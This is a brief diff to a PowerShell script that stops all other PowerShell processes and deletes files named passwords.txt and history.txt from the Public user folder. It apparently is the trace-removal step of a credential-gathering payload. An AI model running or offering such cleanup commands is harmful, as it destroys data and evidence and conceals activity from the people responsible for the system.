@@ -1,5 +1,5 @@
 ﻿Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one is running
-Set-Location C:\Users\Public\Documents #Go to public documents location
+Set-Location C:\Users\Public #Go to public documents location
 #Delete information file
 Remove-Item passwords.txt
 Remove-Item history.txt
